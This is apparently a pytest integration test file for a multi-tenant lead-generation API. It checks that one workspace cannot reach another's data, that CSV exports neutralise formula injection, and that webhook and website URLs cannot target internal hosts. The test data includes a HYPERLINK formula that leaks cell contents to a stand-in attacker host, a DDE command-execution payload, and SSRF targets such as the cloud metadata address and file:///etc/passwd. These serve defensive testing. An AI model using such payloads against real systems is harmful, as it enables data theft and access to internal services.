"""Workspace isolation through the real FastAPI app (service-JWT auth, X-Workspace-Id) — spec §199 "authorization".

User A must never read or modify workspace B's lists, leads, columns, views, campaigns or exports, whatever ids
they put in paths, bodies or filters. Also: CSV injection is neutralized on export, and user-supplied URLs
(webhooks, company websites) cannot target internal hosts.
"""

from __future__ import annotations

import csv
import io
import uuid
from dataclasses import dataclass
from typing import Any

import httpx
import pytest
import sqlalchemy as sa

from scout.auth.context import issue_service_token
from scout.db.engine import session_scope
from scout.db.enums import ColumnDataType, EntityType, ExposureType, ResolverType, SourceType
from scout.db.models import (
    Campaign,
    CustomColumn,
    CustomFieldValue,
    LeadExposure,
    List,
    ListMembership,
    Person,
    SavedView,
    User,
    Workspace,
    WorkspaceMember,
)
from scout.pipeline import campaigns as campaigns_svc
from scout.schemas.campaign import CampaignDefinition
from scout.services import lists as lists_svc
from scout.services import registry

pytestmark = pytest.mark.integration


@dataclass
class Tenant:
    ws: uuid.UUID
    user: str
    list_id: uuid.UUID
    person_id: uuid.UUID
    company_id: uuid.UUID
    column_id: uuid.UUID
    view_id: uuid.UUID
    campaign_id: uuid.UUID


async def _tenant(label: str, *, person_name: str = "Marie Dupont", title: str = "Fondatrice") -> Tenant:
    user = f"user_{label}_{uuid.uuid4().hex[:8]}"
    ev = registry.Evidence(
        source_type=SourceType.website,
        confidence=0.9,
        source_key="website",
        source_url=f"https://{label}.fr/equipe",
        evidence=f"{person_name} — {title}",
    )
    async with session_scope() as s:
        s.add(User(id=user, name=label, email=f"{user}@example.com"))
        ws = Workspace(name=label, slug=f"{label}-{uuid.uuid4().hex[:6]}")
        s.add(ws)
        await s.flush()
        s.add(WorkspaceMember(workspace_id=ws.id, user_id=user, role="owner"))
        comp, _ = await registry.upsert_company(
            s, ws.id, registry.CompanyInput(name=f"Agence {label}", website=f"https://{label}.fr"), ev
        )
        person, _ = await registry.upsert_person(
            s, ws.id, company_id=comp.id, full_name=person_name, job_title=title, evidence=ev
        )
        await registry.record_exposures(s, ws.id, ExposureType.DISCOVERED, person_ids=[person.id])
        lst, _ = await lists_svc.create_list(
            s, ws.id, name=f"{label} leads", user_id=user, entity_type=EntityType.person
        )
        await lists_svc.add_to_list(s, ws.id, lst.id, EntityType.person, [person.id], user_id=user)
        col = CustomColumn(
            workspace_id=ws.id,
            list_id=lst.id,
            name="Secret note",
            slug="secret_note",
            entity_type=EntityType.person,
            data_type=ColumnDataType.text,
            resolver_type=ResolverType.DETERMINISTIC,
        )
        s.add(col)
        view = SavedView(workspace_id=ws.id, list_id=lst.id, name="Mine", entity_type=EntityType.person)
        s.add(view)
        await s.flush()
        s.add(
            CustomFieldValue(
                workspace_id=ws.id,
                column_id=col.id,
                entity_type=EntityType.person,
                entity_id=person.id,
                value_json=f"{label}-secret",
                display_value=f"{label}-secret",
                status="success",
            )
        )
        defn = CampaignDefinition.model_validate({"company_filters": {"industries": ["marketing agency"]}})
        camp = await campaigns_svc.create_campaign(
            s, ws.id, defn, user_id=user, prompt="agencies", start=False
        )
        return Tenant(ws.id, user, lst.id, person.id, comp.id, col.id, view.id, camp.id)


@pytest.fixture
async def tenants(db):
    return await _tenant("alpha"), await _tenant("beta", person_name="Bruno Caron", title="CEO")


@pytest.fixture
async def client(db):
    from scout.main import create_app

    app = create_app()
    async with httpx.AsyncClient(transport=httpx.ASGITransport(app=app), base_url="http://scout.test") as c:
        yield c


def _auth(t: Tenant, ws: uuid.UUID | None = None) -> dict[str, str]:
    return {
        "Authorization": f"Bearer {issue_service_token(t.user, email=f'{t.user}@example.com')}",
        "X-Workspace-Id": str(ws or t.ws),
    }


def _rows(ids: list[uuid.UUID], entity: str = "person") -> dict[str, Any]:
    return {"rows": {"ids": [str(i) for i in ids], "entity_type": entity}}


async def test_authentication_and_membership_are_required(client, tenants):
    a, b = tenants
    assert (await client.get("/v1/lists")).status_code == 401
    bad = {
        "Authorization": "Bearer " + issue_service_token(a.user)[:-4] + "AAAA",
        "X-Workspace-Id": str(a.ws),
    }
    assert (await client.get("/v1/lists", headers=bad)).status_code == 401
    # A valid user sending a workspace they are not a member of (stale cookie) is served their own workspace —
    # never the foreign one; /me reports the effective workspace so the BFF can repair its cookie.
    me = (await client.get("/v1/me", headers=_auth(a, ws=b.ws))).json()
    assert me["current_workspace_id"] == str(a.ws)
    assert {w["id"] for w in me["workspaces"]} == {str(a.ws)}
    lists = (await client.get("/v1/lists", headers=_auth(a, ws=b.ws))).json()
    assert lists and all(x["name"] != "beta leads" for x in lists)
    r = await client.get("/v1/lists", headers={**_auth(a), "X-Workspace-Id": "not-a-uuid"})
    assert r.status_code == 403


async def test_lists_of_another_workspace_are_invisible_and_immutable(client, tenants):
    a, b = tenants
    h = _auth(a)
    names = {x["name"] for x in (await client.get("/v1/lists", headers=h)).json()}
    assert "alpha leads" in names and "beta leads" not in names
    assert (await client.get(f"/v1/lists/{b.list_id}", headers=h)).status_code == 404
    assert (
        await client.patch(f"/v1/lists/{b.list_id}", headers=h, json={"name": "pwned"})
    ).status_code == 404
    assert (await client.delete(f"/v1/lists/{b.list_id}", headers=h)).status_code == 404
    assert (await client.post(f"/v1/lists/{b.list_id}/duplicate", headers=h)).status_code == 404
    assert (
        await client.post(f"/v1/lists/{b.list_id}/members", headers=h, json=_rows([a.person_id]))
    ).status_code == 404
    r = await client.post(f"/v1/lists/{b.list_id}/members/remove", headers=h, json=_rows([b.person_id]))
    assert r.status_code == 404
    r = await client.post(
        f"/v1/lists/{a.list_id}/members/move",
        headers=h,
        json={**_rows([a.person_id]), "to_list_id": str(b.list_id)},
    )
    assert r.status_code == 404
    async with session_scope() as s:
        lst = await s.get(List, b.list_id)
        assert lst is not None and lst.name == "beta leads" and not lst.is_archived
        members = (
            await s.scalars(sa.select(ListMembership.person_id).where(ListMembership.list_id == b.list_id))
        ).all()
    assert members == [b.person_id]


async def test_foreign_ids_cannot_be_pulled_into_your_lists(client, tenants):
    a, b = tenants
    r = await client.post(f"/v1/lists/{a.list_id}/members", headers=_auth(a), json=_rows([b.person_id]))
    assert r.status_code == 200 and r.json()["affected"] == 0
    # service layer (also used by AI tools / undo) refuses foreign ids too
    async with session_scope() as s:
        change = await lists_svc.add_to_list(
            s, a.ws, a.list_id, EntityType.person, [b.person_id], user_id=a.user
        )
        assert change.added == []
        rows = (
            await client.post(
                "/v1/rows/query", headers=_auth(a), json={"scope": "list", "list_id": str(a.list_id)}
            )
        ).json()
    assert [row["id"] for row in rows["rows"]] == [str(a.person_id)]


async def test_rows_queries_are_workspace_scoped(client, tenants):
    a, b = tenants
    h = _auth(a)
    assert (
        await client.post("/v1/rows/query", headers=h, json={"scope": "list", "list_id": str(b.list_id)})
    ).status_code == 404
    people = (await client.post("/v1/rows/query", headers=h, json={"scope": "people"})).json()["rows"]
    assert {p["id"] for p in people} == {str(a.person_id)}
    camp = (
        await client.post(
            "/v1/rows/query", headers=h, json={"scope": "campaign", "campaign_id": str(b.campaign_id)}
        )
    ).json()
    assert camp["rows"] == []
    found = (
        await client.post("/v1/rows/query", headers=h, json={"scope": "people", "search": "Bruno"})
    ).json()
    assert found["rows"] == []


async def test_leads_of_another_workspace_cannot_be_read_or_edited(client, tenants):
    a, b = tenants
    h = _auth(a)
    for path in (
        f"/v1/people/{b.person_id}",
        f"/v1/people/{b.person_id}/history",
        f"/v1/companies/{b.company_id}",
        f"/v1/companies/{b.company_id}/history",
    ):
        r = await client.get(path, headers=h)
        assert r.status_code == 404, (path, r.status_code, r.text[:200])
        assert "Bruno" not in r.text and "beta" not in r.text
    r = await client.patch(
        f"/v1/people/{b.person_id}", headers=h, json={"field": "job_title", "value": "Pwned"}
    )
    assert r.status_code == 404
    r = await client.patch(
        f"/v1/companies/{b.company_id}", headers=h, json={"field": "name", "value": "Pwned"}
    )
    assert r.status_code == 404
    r = await client.post(
        "/v1/review/approve", headers=h, json={"entity_type": "person", "ids": [str(b.person_id)]}
    )
    assert r.json()["approved"] == 0
    await client.post(f"/v1/people/{b.person_id}/contacted", headers=h)
    async with session_scope() as s:
        p = await s.get(Person, b.person_id)
        assert p is not None and p.job_title == "CEO" and p.identity_confidence < 0.97
        contacted = await s.scalar(
            sa.select(sa.func.count())
            .select_from(LeadExposure)
            .where(
                LeadExposure.entity_id == b.person_id, LeadExposure.exposure_type == ExposureType.CONTACTED
            )
        )
    assert contacted == 0


async def test_columns_and_cells_of_another_workspace(client, tenants):
    a, b = tenants
    h = _auth(a)
    cols = (await client.get("/v1/columns", headers=h, params={"list_id": str(b.list_id)})).json()
    assert all(c["id"] != str(b.column_id) for c in cols)
    assert (
        await client.patch(f"/v1/columns/{b.column_id}", headers=h, json={"name": "x"})
    ).status_code == 404
    assert (await client.delete(f"/v1/columns/{b.column_id}", headers=h)).status_code == 404
    assert (await client.post(f"/v1/columns/{b.column_id}/duplicate", headers=h)).status_code == 404
    assert (await client.post(f"/v1/columns/{b.column_id}/enrich", headers=h, json={})).status_code == 404
    r = await client.put(
        f"/v1/columns/{b.column_id}/cells",
        headers=h,
        json={"entity_type": "person", "entity_id": str(b.person_id), "value": "pwned"},
    )
    assert r.status_code == 404
    # a column cannot be attached to someone else's list
    r = await client.post(
        "/v1/columns",
        headers=h,
        json={"name": "Spy", "instruction": "company city", "list_id": str(b.list_id), "run": False},
    )
    assert r.status_code == 404
    # nor can a saved view
    r = await client.post("/v1/views", headers=h, json={"name": "Spy view", "list_id": str(b.list_id)})
    assert r.status_code == 404
    assert (await client.patch(f"/v1/views/{b.view_id}", headers=h, json={"name": "x"})).status_code == 404
    assert (await client.delete(f"/v1/views/{b.view_id}", headers=h)).status_code == 404
    async with session_scope() as s:
        col = await s.get(CustomColumn, b.column_id)
        cell = await s.scalar(
            sa.select(CustomFieldValue.display_value).where(CustomFieldValue.column_id == b.column_id)
        )
        spies = await s.scalar(
            sa.select(sa.func.count()).select_from(CustomColumn).where(CustomColumn.list_id == b.list_id)
        )
        view = await s.get(SavedView, b.view_id)
    assert col is not None and col.name == "Secret note" and cell == "beta-secret" and spies == 1
    assert view is not None and view.name == "Mine"


async def test_campaigns_of_another_workspace(client, tenants):
    a, b = tenants
    h = _auth(a)
    assert (await client.get(f"/v1/campaigns/{b.campaign_id}", headers=h)).status_code == 404
    assert (await client.get(f"/v1/campaigns/{b.campaign_id}/rejections", headers=h)).status_code == 404
    assert (await client.post(f"/v1/campaigns/{b.campaign_id}/cancel", headers=h)).status_code == 404
    assert {c["id"] for c in (await client.get("/v1/campaigns", headers=h)).json()} == {str(a.campaign_id)}
    # exclusion lists / target lists must belong to the caller's workspace
    defn = {
        "company_filters": {"industries": ["marketing agency"]},
        "exclusion": {"mode": "EXCLUDE_SPECIFIC_LISTS", "list_ids": [str(b.list_id)]},
    }
    r = await client.post("/v1/campaigns", headers=h, json={"definition": defn, "start": False})
    assert r.status_code in (404, 422), r.text
    async with session_scope() as s:
        c = await s.get(Campaign, b.campaign_id)
        assert c is not None and c.status.value == "draft"


async def test_exports_never_include_another_workspace(client, tenants):
    a, b = tenants
    h = _auth(a)
    assert (
        await client.post("/v1/exports", headers=h, json={"scope": "list", "list_id": str(b.list_id)})
    ).status_code == 404
    r = await client.post(
        "/v1/exports", headers=h, json={"scope": "selected", "ids": [str(b.person_id), str(a.person_id)]}
    )
    assert r.status_code == 200
    body = r.content.decode("utf-8-sig")
    assert "Marie Dupont" in body and "Bruno Caron" not in body


# ---------------------------------------------------------------------------------------------
# CSV injection (spec §143)
# ---------------------------------------------------------------------------------------------


async def test_csv_injection_is_neutralized_on_export(client, tenants):
    a, _ = tenants
    async with session_scope() as s:
        p = await s.get(Person, a.person_id)
        assert p is not None
        p.job_title = '=HYPERLINK("http://evil.example/?x="&A1,"Click")'
        p.location = "@SUM(1+1)*cmd|' /C calc'!A0"
        await s.execute(
            sa.update(CustomFieldValue)
            .where(CustomFieldValue.column_id == a.column_id)
            .values(display_value="+33 1 23 45 67 89", value_json="+33 1 23 45 67 89")
        )
    r = await client.post(
        "/v1/exports",
        headers=_auth(a),
        json={"scope": "list", "list_id": str(a.list_id), "columns_mode": "all"},
    )
    assert r.status_code == 200
    rows = list(csv.reader(io.StringIO(r.content.decode("utf-8-sig"))))
    header, data = rows[0], rows[1]
    cell = dict(zip(header, data, strict=False))
    assert cell["Title"].startswith("'=HYPERLINK")
    assert cell["Secret note"] == "'+33 1 23 45 67 89"
    for value in data:
        assert (
            not value.startswith(("=", "+", "@", "\t", "\r"))
            or value.lstrip("+-").replace(".", "", 1).isdigit()
        )


def test_safe_cell_rules():
    from scout.util.csv_safe import safe_cell

    assert safe_cell("=1+1") == "'=1+1"
    assert safe_cell("+cmd") == "'+cmd"
    assert safe_cell("-2+3") == "'-2+3"
    assert safe_cell("@SUM(A1)") == "'@SUM(A1)"
    assert safe_cell("\t=1") == "'\t=1"
    assert safe_cell("-12.5") == "-12.5" and safe_cell("+33") == "+33"  # plain numbers stay numbers
    assert safe_cell("Marie") == "Marie" and safe_cell(None) == "" and safe_cell(True) == "true"


# ---------------------------------------------------------------------------------------------
# SSRF on user-supplied URLs
# ---------------------------------------------------------------------------------------------


@pytest.mark.parametrize(
    "url",
    [
        "http://169.254.169.254/latest/meta-data/",
        "http://127.0.0.1:8080/hook",
        "http://localhost/hook",
        "http://10.0.0.5/hook",
        "http://[::1]/hook",
        "file:///etc/passwd",
        "gopher://evil.example/",
        "http://internal-service/hook",
        "https://user:pass@example.com/hook",
        "http://example.com:6379/",
    ],
)
async def test_webhook_urls_cannot_target_internal_hosts(client, tenants, url):
    a, _ = tenants
    r = await client.post("/v1/webhooks", headers=_auth(a), json={"url": url})
    assert r.status_code == 422, r.text
    assert r.json()["error"]["message"].startswith("Webhook URL not allowed")


async def test_webhook_delivery_blocks_dns_rebinding(tenants, monkeypatch):
    """The URL looked public at creation; at delivery it resolves to the metadata service → blocked at connect."""
    from scout.crawl import ssrf
    from scout.db.models import Webhook
    from scout.jobs.registry import JobContext
    from scout.pipeline.maintenance import deliver_webhook

    a, _ = tenants
    async with session_scope() as s:
        s.add(
            Webhook(
                workspace_id=a.ws,
                url="http://hooks.rebind.example/in",
                secret="s3cret",
                events=["lead.qualified"],
            )
        )

    async def rebind(host, port):
        return [("169.254.169.254", port)]

    monkeypatch.setattr(ssrf, "_getaddrinfo", rebind)
    ctx = JobContext(
        job_id=uuid.uuid4(),
        workspace_id=a.ws,
        campaign_id=None,
        type="webhook.deliver",
        payload={"event": "lead.qualified", "data": {"x": 1}},
        attempt=1,
        worker_id="t",
    )
    out = await deliver_webhook(ctx)
    assert out == {"sent": 0}
    async with session_scope() as s:
        hook = await s.scalar(sa.select(Webhook).where(Webhook.workspace_id == a.ws))
    assert hook is not None and hook.last_status == 0


@pytest.mark.parametrize("url", ["http://127.0.0.1:5432/", "localhost", "http://169.254.169.254/"])
async def test_company_website_edits_cannot_target_internal_hosts(client, tenants, url):
    a, _ = tenants
    r = await client.patch(
        f"/v1/companies/{a.company_id}", headers=_auth(a), json={"field": "website_url", "value": url}
    )
    assert r.status_code == 422, r.text
    ok = await client.patch(
        f"/v1/companies/{a.company_id}",
        headers=_auth(a),
        json={"field": "website_url", "value": "www.alpha-new.fr/home"},
    )
    assert ok.status_code == 200
